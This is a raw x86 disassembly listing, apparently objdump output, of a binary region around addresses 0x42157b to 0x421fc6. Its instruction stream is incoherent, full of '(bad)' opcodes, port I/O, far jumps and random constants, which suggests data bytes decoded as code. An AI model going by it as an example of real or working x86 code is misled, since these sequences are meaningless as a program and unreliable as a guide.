  42157b:	cwde   
  42157c:	pop    ebx
  42157d:	fcom   DWORD PTR [ebx-0x202441ea]
  421583:	ret    0x1757
  421586:	(bad)  
  421587:	inc    esi
  421588:	stos   DWORD PTR es:[edi],eax
  421589:	clc    
  42158a:	push   ecx
  42158b:	(bad)  
  42158c:	out    dx,al
  42158d:	push   0x20
  42158f:	lds    esp,FWORD PTR ds:0xbe2cf0fe
  421595:	ret    0x3adc
  421598:	aad    0xc3
  42159a:	or     esi,edi
  42159c:	dec    eax
  42159d:	(bad)  
  42159e:	packssdw mm1,QWORD PTR [esi+0x72b7f61]
  4215a5:	aad    0x6f
  4215a7:	retf   
  4215a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215a9:	sub    BYTE PTR [esi+0x1f2e8cca],cl
  4215af:	jle    0x4215a5
  4215b1:	jnp    0x4215ce
  4215b3:	push   cs
  4215b4:	arpl   WORD PTR [edx-0x59],bx
  4215b7:	in     al,0x7d
  4215b9:	mov    ah,0xb1
  4215bb:	xchg   DWORD PTR ds:0x72c68849,esp
  4215c1:	ds stc 
  4215c3:	mov    ah,0xd
  4215c5:	mov    ebp,0x35bc2673
  4215ca:	pop    ecx
  4215cb:	data16 (bad) 
  4215cd:	xlat   BYTE PTR ds:[ebx]
  4215ce:	or     eax,0x1a12e172
  4215d3:	gs mov ebx,0x146a1e6c
  4215d9:	daa    
  4215da:	add    eax,esi
  4215dc:	xlat   BYTE PTR ds:[ebx]
  4215dd:	sbb    esi,ebp
  4215df:	pop    edi
  4215e0:	repnz scas eax,DWORD PTR es:[edi]
  4215e2:	pshufw mm3,mm2,0x41
  4215e6:	jp     0x42158f
  4215e8:	add    ah,ah
  4215ea:	fst    QWORD PTR [ebx+0x27]
  4215ed:	jbe    0x4215a1
  4215ef:	dec    edi
  4215f0:	fwait
  4215f1:	daa    
  4215f2:	call   0xd762b69
  4215f7:	inc    ebp
  4215f8:	je     0x421676
  4215fa:	std    
  4215fb:	cdq    
  4215fc:	rol    DWORD PTR [eax-0x24],cl
  4215ff:	aaa    
  421600:	jne    0x421662
  421602:	fidiv  WORD PTR [ecx]
  421604:	or     DWORD PTR [edi-0x702a3f02],eax
  42160a:	shl    dh,0x1e
  42160d:	shr    DWORD PTR [esi+ecx*8-0x54],0x98
  421612:	loope  0x42168e
  421614:	xor    al,0x97
  421616:	jmp    0x3ad355ae
  42161b:	or     BYTE PTR fs:[ebp+0x20aec9f3],0x92
  421623:	nop
  421624:	popa   
  421625:	cmp    al,0x8e
  421627:	fdivr  DWORD PTR [ebx-0x5f]
  42162a:	pop    ebx
  42162b:	je     0x421604
  42162d:	pop    eax
  42162e:	mov    ds:0xae839f47,eax
  421633:	shl    ch,0x0
	...
  421696:	stos   DWORD PTR es:[edi],eax
  421697:	sub    al,0xed
  421699:	stos   BYTE PTR es:[edi],al
  42169a:	out    dx,eax
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	popf   
  4216a3:	xor    al,0x53
  4216a5:	js     0x421684
  4216a7:	bound  eax,QWORD PTR [ecx]
  4216a9:	add    BYTE PTR [edi],al
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    ch,bl
  4216af:	in     eax,0x86
  4216b1:	enter  0x750f,0xc3
  4216b5:	or     al,0x4e
  4216b7:	hlt    
  4216b8:	cld    
  4216b9:	pop    ecx
  4216ba:	stos   BYTE PTR es:[edi],al
  4216bb:	gs inc ecx
  4216bd:	jmp    0x5ecf:0x7c333902
  4216c4:	push   ds
  4216c5:	xor    ebx,edi
  4216c7:	and    BYTE PTR [eax],al
  4216c9:	loopne 0x42164b
  4216cb:	aas    
  4216cc:	es xchg esp,eax
  4216ce:	xchg   esi,eax
  4216cf:	(bad)  
  4216d0:	icebp  
  4216d1:	pop    ebp
  4216d2:	test   al,0x6b
  4216d4:	push   ebx
  4216d5:	push   ds
  4216d6:	or     DWORD PTR [esp+eax*8+0x45],ebx
  4216da:	scas   eax,DWORD PTR es:[edi]
  4216db:	scas   eax,DWORD PTR es:[edi]
  4216dc:	or     BYTE PTR [esi],0xd7
  4216df:	mov    DWORD PTR [eax-0x650fd8e9],esp
  4216e5:	lods   eax,DWORD PTR ds:[esi]
  4216e6:	lock test esp,ebx
  4216e9:	out    dx,al
  4216ea:	xchg   al,dh
  4216ec:	cmp    al,BYTE PTR [ebx]
  4216ee:	pop    ebp
  4216ef:	pop    edx
  4216f0:	cld    
  4216f1:	add    al,bh
  4216f3:	test   DWORD PTR [edx-0x3c89eabe],ebx
  4216f9:	ja     0x4216be
  4216fb:	add    ebp,0x53ec305f
  421701:	xchg   edx,eax
  421702:	push   eax
  421703:	nop
  421704:	pop    eax
  421705:	int    0xe
  421707:	pop    esp
  421708:	mov    edx,0x8ca4ab86
  42170d:	sub    esp,edx
  42170f:	pop    ss
  421710:	ss and bl,ah
  421713:	aaa    
  421714:	mov    esi,0xebb5dd0b
  421719:	icebp  
  42171a:	xchg   esp,eax
  42171b:	or     esi,ebp
  42171d:	inc    edx
  42171e:	out    dx,al
  42171f:	hlt    
  421720:	inc    ecx
  421721:	mov    bl,0xb8
  421723:	ret    0x81e4
  421726:	mov    bh,0xae
  421728:	rol    bh,0x74
  42172b:	or     bh,ch
  42172d:	dec    edi
  42172e:	sub    bh,cl
  421730:	iret   
  421731:	pusha  
  421732:	push   0xdee42304
  421737:	loopne 0x4217b2
  421739:	mov    BYTE PTR [esi-0x1b19a48f],dl
  42173f:	xchg   esi,eax
  421740:	jb     0x421785
  421742:	mov    edi,edi
  421744:	jmp    0x421723
  421746:	dec    eax
  421747:	xchg   DWORD PTR ds:0x361c0dd6,edx
  42174d:	fdivr  DWORD PTR [edx]
  42174f:	add    esi,DWORD PTR [ecx-0x32e1a1f1]
  421755:	and    ch,dh
  421757:	fnstsw WORD PTR [eax+eiz*4]
  42175a:	sbb    BYTE PTR [edi-0x2945e814],bh
  421760:	mov    ds:0x8cb34701,al
  421765:	(bad)  
  421766:	xchg   esp,eax
  421767:	xchg   esp,eax
  421768:	sbb    al,0x32
  42176a:	scas   al,BYTE PTR es:[edi]
  42176b:	mov    ebp,0x29e6bf1e
  421770:	or     DWORD PTR [ebp+0x60],esp
  421773:	sbb    DWORD PTR [edi+eiz*4],ebp
  421776:	sub    DWORD PTR [esi],esi
  421778:	and    al,0xc7
  42177a:	mov    ss,WORD PTR [ebx]
  42177c:	dec    esp
  42177d:	or     BYTE PTR [ebp+0x28],bl
  421780:	inc    edx
  421781:	loopne 0x42178f
  421783:	nop
  421784:	inc    esi
  421785:	repnz pop esi
  421787:	jmp    0xa92:0x71b70feb
  42178e:	pop    edx
  42178f:	lahf   
  421790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421791:	xchg   edx,eax
  421792:	mov    edi,0xe5c13c16
  421797:	xchg   esi,eax
  421798:	inc    edx
  421799:	shl    BYTE PTR [ebx],cl
  42179b:	out    0x68,eax
  42179d:	dec    eax
  42179e:	mov    BYTE PTR [eax],dl
  4217a0:	or     BYTE PTR [edi+0x63],dl
  4217a3:	dec    ebp
  4217a4:	out    0x53,al
  4217a6:	jns    0x421797
  4217a8:	test   al,0x1b
  4217aa:	daa    
  4217ab:	jp     0x42173a
  4217ad:	push   ds
  4217ae:	nop
  4217af:	inc    esi
  4217b0:	add    ch,BYTE PTR [esi+ebp*8+0xe587]
	...
  421813:	add    BYTE PTR [eax],al
  421815:	add    cl,dl
  421817:	mov    al,ds:0xf9f9e0b9
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	in     al,0x18
  421824:	das    
  421825:	ins    DWORD PTR es:[edi],dx
  421826:	in     al,0x63
  421828:	add    DWORD PTR [eax],eax
  42182a:	pop    es
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    BYTE PTR [ebx+esi*8],ah
  421830:	out    0x39,eax
  421832:	ins    BYTE PTR es:[edi],dx
  421833:	out    dx,al
  421834:	or     BYTE PTR [ecx+0x31],ah
  421837:	imul   ebp,DWORD PTR [eax-0x37],0xffffffc2
  42183b:	cld    
  42183c:	leave  
  42183d:	jne    0x4217f7
  42183f:	inc    esp
  421840:	fs mov edx,0xae8054c0
  421846:	icebp  
  421847:	sahf   
  421848:	sahf   
  421849:	or     eax,0xf6c2cbbb
  42184e:	sub    DWORD PTR [eax+0x1c],0xffffffd3
  421852:	add    edx,edi
  421854:	lods   al,BYTE PTR ds:[esi]
  421855:	or     cl,BYTE PTR [edi-0x3bf8a45]
  42185b:	rcl    BYTE PTR [eax],1
  42185d:	jecxz  0x421884
  42185f:	add    ecx,ebx
  421861:	fs int3 
  421863:	sahf   
  421864:	jmp    0x4218e1
  421866:	jle    0x42187b
  421868:	rcr    DWORD PTR [eax],cl
  42186a:	mov    edi,0xb32e8cdd
  42186f:	sbb    bh,dh
  421871:	dec    ebp
  421872:	mov    dl,0x83
  421874:	xor    al,ch
  421876:	inc    esi
  421877:	and    edx,DWORD PTR ds:0x41d44a2e
  42187d:	leave  
  42187e:	out    0x4e,al
  421880:	scas   al,BYTE PTR es:[edi]
  421881:	sub    ebx,eax
  421883:	iret   
  421884:	mov    edx,0xed009f3f
  421889:	push   ebx
  42188a:	cs sub dh,al
  42188d:	inc    ebp
  42188e:	(bad)  
  42188f:	outs   dx,DWORD PTR ds:[esi]
  421890:	sbb    eax,0x368cbc54
  421895:	ins    DWORD PTR es:[edi],dx
  421896:	fistp  DWORD PTR [ecx]
  421898:	sbb    ebp,DWORD PTR ds:0x997488dd
  42189e:	aam    0x50
  4218a0:	mov    esi,0x12e8b9
  4218a5:	fwait
  4218a6:	jmp    0x4218d1
  4218a8:	leave  
  4218a9:	push   0x27
  4218ab:	and    eax,0xa5204e3e
  4218b0:	jl     0x42189c
  4218b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218b3:	cmp    al,0xae
  4218b5:	push   eax
  4218b6:	xor    eax,DWORD PTR [ecx+0x5b918ed2]
  4218bc:	ret    0x79ef
  4218bf:	nop
  4218c0:	lods   eax,DWORD PTR ds:[esi]
  4218c1:	sub    edx,DWORD PTR ss:[ecx]
  4218c4:	lea    esp,[eax+0x1332989e]
  4218ca:	or     ah,al
  4218cc:	iret   
  4218cd:	fdivr  DWORD PTR [eax-0x2b6e9d51]
  4218d3:	pop    es
  4218d4:	sub    DWORD PTR ds:0x7f143230,0x86650769
  4218de:	add    DWORD PTR [ebp+ebx*4+0x1cdd5b4c],ecx
  4218e5:	(bad)  [edx+0x7d856772]
  4218eb:	aad    0xe1
  4218ed:	mov    eax,ds:0x29f9c396
  4218f2:	mov    bh,0x9e
  4218f4:	addr16 pop esp
  4218f6:	rol    DWORD PTR [edi-0x19678013],1
  4218fc:	(bad)  
  4218ff:	cwde   
  421900:	push   es
  421901:	les    ebp,FWORD PTR ds:0xc4c40281
  421907:	jecxz  0x421944
  421909:	into   
  42190a:	jl     0x4218c5
  42190c:	mov    ah,0x82
  42190e:	and    al,0x5d
  421910:	retf   0xda37
  421913:	fist   DWORD PTR [edx+0x1]
  421916:	push   eax
  421917:	push   ebp
  421918:	pop    eax
  421919:	xor    DWORD PTR [ebx-0x792eb6ef],0x89f2a6a8
  421923:	cmp    dl,al
  421925:	pop    ebx
  421926:	dec    ebp
  421927:	cld    
  421928:	icebp  
  421929:	je     0x421974
  42192b:	lea    ebp,[edi]
  42192d:	inc    ebx
  42192e:	ret    0x116f
  421931:	sub    edx,DWORD PTR [ebp+0x4370]
	...
  421993:	add    BYTE PTR [eax],al
  421995:	add    dh,bh
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx+0x3decdc5a],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    BYTE PTR [eax+edi*2],bh
  4219b0:	scas   eax,DWORD PTR es:[edi]
  4219b1:	xchg   ecx,eax
  4219b2:	push   ebx
  4219b3:	mov    ecx,0xc4bd2777
  4219b8:	jae    0x421a14
  4219ba:	retf   0x2c9a
  4219bd:	mov    al,0xaa
  4219bf:	shl    bh,cl
  4219c1:	call   0x3aa9:0x945a9384
  4219c8:	mov    cl,0xee
  4219ca:	or     BYTE PTR [eax],bh
  4219cc:	dec    edi
  4219cd:	addr16 jnp 0x42198e
  4219d0:	pop    es
  4219d1:	mov    ebx,gs
  4219d3:	cmp    DWORD PTR [ebp-0x1fba6d7e],ecx
  4219d9:	(bad)  
  4219db:	inc    ecx
  4219dc:	stos   DWORD PTR es:[edi],eax
  4219dd:	fstp   DWORD PTR [edx-0x7234af53]
  4219e3:	jmp    0xeb8cd507
  4219e8:	vpunpckhwd xmm7,xmm5,XMMWORD PTR [edx]
  4219ec:	cmp    eax,0x58166019
  4219f1:	test   al,0xad
  4219f3:	adc    ecx,eax
  4219f5:	stos   DWORD PTR es:[edi],eax
  4219f6:	pop    esi
  4219f7:	test   al,0x79
  4219f9:	out    0xbc,al
  4219fb:	adc    al,0x42
  4219fd:	inc    eax
  4219fe:	pop    eax
  4219ff:	and    DWORD PTR [eax-0x30e51a4d],0x4e7ffa3f
  421a09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a0a:	push   ebx
  421a0b:	je     0x421a32
  421a0d:	add    esi,DWORD PTR [ecx+0x54dbefff]
  421a13:	(bad)  
  421a14:	sbb    ebp,DWORD PTR [eax+0x4e24ca9a]
  421a1a:	enter  0x1cc,0x23
  421a1e:	pop    ebx
  421a1f:	xor    bl,ah
  421a21:	scas   al,BYTE PTR es:[edi]
  421a22:	jecxz  0x4219dc
  421a24:	mov    ebx,0xb7883fd9
  421a29:	fdivrp st(6),st
  421a2b:	clc    
  421a2c:	add    dl,BYTE PTR [esi+ebp*4]
  421a2f:	xor    bh,BYTE PTR [esi+0x653bed33]
  421a35:	adc    bh,BYTE PTR ds:0xb9845882
  421a3b:	jg     0x421a23
  421a3d:	mov    ebx,0x40756de0
  421a42:	pop    ds
  421a43:	push   ecx
  421a44:	popf   
  421a45:	cmp    BYTE PTR [ecx],0xcf
  421a48:	das    
  421a49:	dec    esp
  421a4a:	add    al,0x81
  421a4c:	retf   
  421a4d:	addr16 push ecx
  421a4f:	in     al,0x96
  421a51:	test   BYTE PTR [edx-0x414cbf31],bh
  421a57:	dec    esp
  421a58:	test   cl,0x73
  421a5b:	std    
  421a5c:	push   ds
  421a5d:	ror    BYTE PTR [ebp+0x3f9d0759],cl
  421a63:	in     al,dx
  421a64:	mov    ebx,edi
  421a66:	pop    esp
  421a67:	(bad)  
  421a68:	fist   WORD PTR [edi+ecx*4+0x56]
  421a6c:	mov    dh,0x2a
  421a6e:	pushf  
  421a6f:	retf   0xa1e0
  421a72:	(bad)  
  421a73:	adc    DWORD PTR [ebx+0x2f049bc2],esp
  421a79:	xchg   ecx,eax
  421a7a:	ds jle 0x4219fe
  421a7d:	inc    eax
  421a7e:	outs   dx,DWORD PTR ds:[esi]
  421a7f:	push   esp
  421a80:	xchg   edx,eax
  421a81:	pop    ebp
  421a82:	cmp    DWORD PTR [eax],ecx
  421a84:	dec    ebp
  421a85:	ds xchg ecx,eax
  421a87:	ss cld 
  421a89:	push   eax
  421a8a:	sub    DWORD PTR [edi+0x25b29f91],edi
  421a90:	retf   
  421a91:	adc    al,0xe4
  421a93:	out    dx,al
  421a94:	out    0x63,al
  421a96:	adc    ah,dl
  421a98:	mov    al,BYTE PTR [esi+0x2048c47f]
  421a9e:	push   0x749a2d3d
  421aa3:	fwait
  421aa4:	test   al,0xe
  421aa6:	sub    al,0xf4
  421aa8:	shl    BYTE PTR [esi],1
  421aaa:	stos   DWORD PTR es:[edi],eax
  421aab:	mov    dh,0x9b
  421aad:	test   eax,0xfc6476be
  421ab2:	jmp    0x421a7c
  421ab4:	outs   dx,DWORD PTR ds:[esi]
	...
  421b15:	add    BYTE PTR [esi],dl
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx-0x23fca366],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    BYTE PTR ds:0x8dc1f70,ch
  421b33:	xor    bl,bh
  421b35:	xor    eax,0x93d614cd
  421b3a:	sbb    DWORD PTR [ebp+ebx*2+0x22cf20ba],esp
  421b41:	pop    ds
  421b42:	in     al,dx
  421b43:	jle    0x421afd
  421b45:	lds    esi,FWORD PTR [ecx+0x3202da41]
  421b4b:	inc    ebx
  421b4c:	pop    ebp
  421b4d:	sub    eax,0x3e12acc4
  421b52:	sar    DWORD PTR [ebx+ebx*4],1
  421b55:	not    BYTE PTR [edx-0x26]
  421b58:	punpckldq mm1,DWORD PTR [ecx]
  421b5b:	fisubr DWORD PTR [ecx+0x46]
  421b5e:	pusha  
  421b5f:	data16 jb 0x421b7d
  421b62:	mov    WORD PTR [esi],cs
  421b64:	lock push 0x3ed41ab6
  421b6a:	mov    edx,0x3a6cc9c3
  421b6f:	dec    ebp
  421b70:	leave  
  421b71:	maskmovq mm1,(bad)
  421b72:	test   DWORD PTR ds:0x78647aa7,0xbcee3de7
  421b7c:	push   edx
  421b7d:	mov    ds,WORD PTR [esi]
  421b7f:	ins    BYTE PTR es:[edi],dx
  421b80:	lds    esp,FWORD PTR [ebx+0x13]
  421b83:	(bad)  
  421b85:	xchg   ebp,eax
  421b86:	fwait
  421b87:	sub    eax,0x5697aff8
  421b8c:	imul   edx,DWORD PTR [ecx],0x1c
  421b8f:	mov    dl,0xca
  421b91:	pop    edi
  421b92:	sub    dl,BYTE PTR [eax+0x60]
  421b95:	inc    eax
  421b96:	cmp    al,0x96
  421b98:	icebp  
  421b99:	mov    ds:0xdceda312,eax
  421b9e:	fwait
  421b9f:	stos   BYTE PTR es:[edi],al
  421ba0:	and    edx,ebp
  421ba2:	frstor [esp+ecx*1-0x46]
  421ba6:	ss pop ecx
  421ba8:	and    al,0x94
  421baa:	adc    esi,DWORD PTR [edi]
  421bac:	call   0xcb271bd
  421bb1:	mov    ds:0x69de1c7c,eax
  421bb6:	lods   eax,DWORD PTR ds:[esi]
  421bb7:	je     0x421b7d
  421bb9:	sbb    BYTE PTR [ebp+edi*2+0x36],dh
  421bbd:	inc    ecx
  421bbe:	mov    eax,ds:0xb2dfa5ba
  421bc3:	push   ebp
  421bc4:	push   ebp
  421bc5:	push   ebp
  421bc6:	jl     0x421b4d
  421bc8:	neg    BYTE PTR [eax-0x2292b569]
  421bce:	fstp   TBYTE PTR [ecx-0x537d2031]
  421bd4:	push   ebx
  421bd5:	push   edi
  421bd6:	dec    edi
  421bd7:	pop    es
  421bd8:	inc    esp
  421bd9:	out    0xbe,eax
  421bdb:	xchg   ebx,eax
  421bdc:	mov    cl,0xc8
  421bde:	out    dx,al
  421bdf:	loope  0x421b86
  421be1:	je     0x421c05
  421be3:	and    BYTE PTR [edx+0x31],cl
  421be6:	stos   BYTE PTR es:[edi],al
  421be7:	or     dl,BYTE PTR ss:[esp+esi*8]
  421beb:	cmp    DWORD PTR [ebx],esi
  421bed:	or     esi,DWORD PTR [edx+ecx*2+0x7fae03a7]
  421bf4:	arpl   WORD PTR [ecx-0x3f],dx
  421bf7:	mov    BYTE PTR [ebx-0x3],0x8f
  421bfb:	arpl   di,bp
  421bfd:	loop   0x421b82
  421bff:	xchg   edx,eax
  421c00:	sbb    DWORD PTR [edi+0x48],edx
  421c03:	and    dh,BYTE PTR [eax+0x59]
  421c06:	sub    DWORD PTR [ebx+0x20ff33f3],ebx
  421c0c:	add    al,0xf1
  421c0e:	pop    esi
  421c0f:	cmp    eax,0xba1d351c
  421c14:	ror    DWORD PTR [ebx-0x78],1
  421c17:	out    0x3d,eax
  421c19:	jb     0x421bc4
  421c1b:	cmp    BYTE PTR [edi],al
  421c1d:	es jg  0x421c51
  421c20:	adc    bl,BYTE PTR [edi-0x6e]
  421c23:	xchg   ebp,eax
  421c24:	pop    ebx
  421c25:	sub    esp,ebx
  421c27:	mov    cl,ah
  421c29:	popa   
  421c2a:	adc    dh,dh
  421c2c:	push   ecx
  421c2d:	test   esp,0xded14ccc
  421c33:	sub    bh,BYTE PTR [edx+0x0]
	...
  421c95:	add    BYTE PTR [eax-0x1a4a95],dh
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp-0x3d2f40e7],0xd4
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    BYTE PTR [eax],cl
  421caf:	sar    BYTE PTR cs:[esi-0x4a],0x72
  421cb4:	stos   DWORD PTR es:[edi],eax
  421cb5:	out    0x1f,eax
  421cb7:	jecxz  0x421c45
  421cb9:	mov    ecx,0x636abc96
  421cbe:	mov    cl,0xcf
  421cc0:	(bad)  
  421cc1:	daa    
  421cc2:	or     al,0xda
  421cc4:	ret    0xfa96
  421cc7:	mov    al,0x96
  421cc9:	add    esp,DWORD PTR ds:0x772bf053
  421ccf:	mov    ds:0x2dd94d17,al
  421cd4:	cld    
  421cd5:	data16 jae 0x421cd7
  421cd8:	mov    es,WORD PTR [ebx]
  421cda:	cmp    eax,0xa44acbc5
  421cdf:	inc    ebx
  421ce0:	rol    DWORD PTR [ecx],0xc9
  421ce3:	mov    al,ds:0xe0b09276
  421ce8:	and    al,0xfb
  421cea:	test   BYTE PTR [edx+0x2e182e22],dl
  421cf0:	lock fstp TBYTE PTR [esi]
  421cf3:	jp     0x421d07
  421cf5:	fs aaa 
  421cf7:	add    DWORD PTR [ecx+0x50b9b83b],ebp
  421cfd:	fld    TBYTE PTR [ebx]
  421cff:	jo     0x421cc9
  421d01:	adc    al,0x4c
  421d03:	imul   BYTE PTR [ebp+0x39684952]
  421d09:	shr    DWORD PTR [esi],1
  421d0b:	or     DWORD PTR [ebx],0xfffffffc
  421d0e:	dec    esi
  421d0f:	xchg   ebp,eax
  421d10:	repz sbb DWORD PTR [eax-0x18],ebp
  421d14:	imul   esi,esi,0x74f78b3d
  421d1a:	loopne 0x421d2f
  421d1c:	(bad)  [eax]
  421d1e:	in     eax,0xf4
  421d20:	and    dh,BYTE PTR [esi]
  421d22:	loope  0x421d13
  421d24:	pop    edx
  421d25:	dec    edx
  421d26:	adc    bl,BYTE PTR [edx+ebp*4+0x4d24356c]
  421d2d:	mov    ebp,0x15e634b5
  421d32:	pop    ebx
  421d33:	sbb    edx,ecx
  421d35:	mov    bh,0x7f
  421d37:	stos   DWORD PTR es:[edi],eax
  421d38:	add    DWORD PTR [eax],esp
  421d3a:	sbb    DWORD PTR [eax-0x1a],0xcfe84a07
  421d41:	bound  ebx,QWORD PTR [eax]
  421d43:	push   0x41df23e5
  421d48:	(bad)  
  421d49:	das    
  421d4a:	int    0xbc
  421d4c:	mov    dl,BYTE PTR [edi]
  421d4e:	mov    bh,0xfc
  421d50:	xchg   BYTE PTR [ebp+0x1e],ch
  421d53:	fimul  DWORD PTR [ebx]
  421d55:	xor    eax,0x3c9ea6d4
  421d5a:	scas   al,BYTE PTR es:[edi]
  421d5b:	cmp    BYTE PTR [ecx],0xc8
  421d5e:	mov    ds:0xf5f7e1a9,al
  421d63:	int    0x39
  421d65:	nop
  421d66:	or     bl,BYTE PTR [esi-0x33c4d8fa]
  421d6c:	loope  0x421d46
  421d6e:	in     eax,0xd4
  421d70:	cld    
  421d71:	push   esi
  421d72:	aas    
  421d73:	push   edx
  421d74:	lahf   
  421d75:	mov    ebx,DWORD PTR [edx-0x24]
  421d78:	mov    bl,0x57
  421d7a:	mov    ch,0x90
  421d7c:	sub    DWORD PTR [ebx-0x15],edi
  421d7f:	xchg   esp,eax
  421d80:	lock inc eax
  421d82:	fdiv   st,st(5)
  421d84:	sbb    eax,0xcf2cda72
  421d89:	xlat   BYTE PTR ds:[ebx]
  421d8a:	jmp    0x210ce72a
  421d8f:	mov    ds:0xded077bc,al
  421d94:	(bad)  
  421d95:	mov    bl,0xa5
  421d97:	xchg   edx,eax
  421d98:	ret    
  421d99:	test   DWORD PTR [edi+0x4483fc49],ecx
  421d9f:	push   DWORD PTR [edi]
  421da1:	inc    edx
  421da2:	sub    bl,dl
  421da4:	jns    0x421dfe
  421da6:	adc    edx,edi
  421da8:	xchg   edi,eax
  421da9:	inc    edi
  421daa:	mov    ds:0x3f7443f1,al
  421daf:	add    edx,DWORD PTR [edx]
  421db1:	repnz ds ins BYTE PTR es:[edi],dx
  421db4:	jg     0x421db6
	...
  421e16:	iret   
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    BYTE PTR [ebx],bl
  421e23:	ror    DWORD PTR [edx+0x1680032],1
  421e29:	add    BYTE PTR [edi],al
  421e2b:	add    DWORD PTR [eax],eax
  421e2d:	add    BYTE PTR [ebx-0xf],dh
  421e30:	pop    ss
  421e31:	in     al,dx
  421e32:	cmp    esi,DWORD PTR [ebp-0x50e2098b]
  421e38:	jge    0x421de0
  421e3a:	push   eax
  421e3b:	test   al,0x5a
  421e3d:	aad    0x2b
  421e3f:	js     0x421e21
  421e41:	(bad)  
  421e42:	jo     0x421de4
  421e44:	mov    ds:0x546931c2,eax
  421e49:	cld    
  421e4a:	push   cs
  421e4b:	lahf   
  421e4c:	imul   ecx,DWORD PTR [ebx-0x5157a33d],0x2e9b140b
  421e56:	aas    
  421e57:	sbb    eax,0x59885f9a
  421e5c:	cmc    
  421e5d:	push   cs
  421e5e:	xlat   BYTE PTR ds:[ebx]
  421e5f:	call   ebx
  421e61:	outs   dx,BYTE PTR ds:[esi]
  421e62:	pop    DWORD PTR [edx-0x11]
  421e65:	cmp    al,0x60
  421e67:	out    0x6e,al
  421e69:	and    DWORD PTR [edx-0x53],esp
  421e6c:	sbb    DWORD PTR [ebp+eiz*8+0x73d14079],edi
  421e73:	mov    al,0xb6
  421e75:	mov    ebp,0x902cf59c
  421e7a:	pop    esp
  421e7b:	add    ebp,eax
  421e7d:	test   al,0x2f
  421e7f:	loopne 0x421ea6
  421e81:	rcr    BYTE PTR [ebx+0x4b],0x2a
  421e85:	pop    eax
  421e86:	mov    BYTE PTR [edi],cl
  421e88:	mov    esp,0x57a66ee9
  421e8d:	push   esp
  421e8e:	sar    BYTE PTR [edi-0x2df44363],1
  421e94:	cmp    ebp,DWORD PTR [ebx+0x27]
  421e97:	(bad)  
  421e98:	in     al,dx
  421e99:	jmp    0x6627:0x4d217585
  421ea0:	inc    edi
  421ea1:	or     al,0x7e
  421ea3:	add    edi,DWORD PTR [ecx-0x274bea0a]
  421ea9:	sub    al,0x4
  421eab:	or     DWORD PTR [ecx],esi
  421ead:	pop    ebp
  421eae:	jno    0x421e74
  421eb0:	add    bl,BYTE PTR ds:0xb79fa5b0
  421eb6:	outs   dx,BYTE PTR ds:[esi]
  421eb7:	xchg   DWORD PTR [ebp-0x2c],eax
  421eba:	push   cs
  421ebb:	or     edi,DWORD PTR ds:0xdc1b2912
  421ec1:	ss shl bh,0xa7
  421ec5:	xor    esi,DWORD PTR [eax+0x19]
  421ec8:	push   edx
  421ec9:	pop    edi
  421eca:	jge    0x421f4a
  421ecc:	sbb    al,0x35
  421ece:	mov    es,WORD PTR [ebx+0x97fc6f5]
  421ed4:	mov    BYTE PTR [esi],al
  421ed6:	add    eax,0xf5e0ae8d
  421edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421edc:	mov    dl,0xa4
  421ede:	push   eax
  421edf:	xor    BYTE PTR [esi+0x1f],cl
  421ee2:	add    BYTE PTR [ebp-0x40],dl
  421ee5:	scas   al,BYTE PTR es:[edi]
  421ee6:	cmp    DWORD PTR [esi-0x4dd6d996],ebp
  421eec:	aam    0xb8
  421eee:	push   cs
  421eef:	and    BYTE PTR [edi+esi*8-0x7d5b44f3],ah
  421ef6:	cmp    BYTE PTR [edx],dl
  421ef8:	out    dx,al
  421ef9:	or     BYTE PTR [ebp-0x1e],0xa5
  421efd:	test   cl,cl
  421eff:	out    0xc6,al
  421f01:	repnz and dl,bh
  421f04:	adc    eax,0xf3de904f
  421f09:	mov    bl,0xf
  421f0b:	aad    0xeb
  421f0d:	lods   al,BYTE PTR ds:[esi]
  421f0e:	lock jmp 0x73196060
  421f14:	fxch   st(7)
  421f16:	inc    eax
  421f17:	mov    WORD PTR [ecx-0x7c],es
  421f1a:	leave  
  421f1b:	cdq    
  421f1c:	or     ecx,DWORD PTR [ebx-0x4e]
  421f1f:	(bad)  
  421f20:	mov    bl,0xb6
  421f22:	sbb    al,0x76
  421f24:	ret    
  421f25:	(bad)  
  421f26:	xor    DWORD PTR [ecx-0x6c3dd428],ebp
  421f2c:	shl    ch,cl
  421f2e:	jge    0x421fa6
  421f30:	popf   
  421f31:	add    cl,0x6a
  421f34:	imul   eax,DWORD PTR [eax],0x0
	...
  421f93:	add    BYTE PTR [eax],al
  421f95:	add    BYTE PTR [ebx+0x6],ch
  421f98:	(bad)  
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0xa6deaf78
  421fa4:	mov    bl,0x8
  421fa6:	pop    es
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    BYTE PTR [eax+0x18],ah
  421fb0:	adc    esi,DWORD PTR [edi+0x23d4f3d6]
  421fb6:	je     0x421fe9
  421fb8:	aaa    
  421fb9:	mov    esp,0x6d5a9c1f
  421fbe:	in     al,0x9
  421fc0:	lea    esi,[ebp-0x63bc2434]
  421fc6:	inc    esi
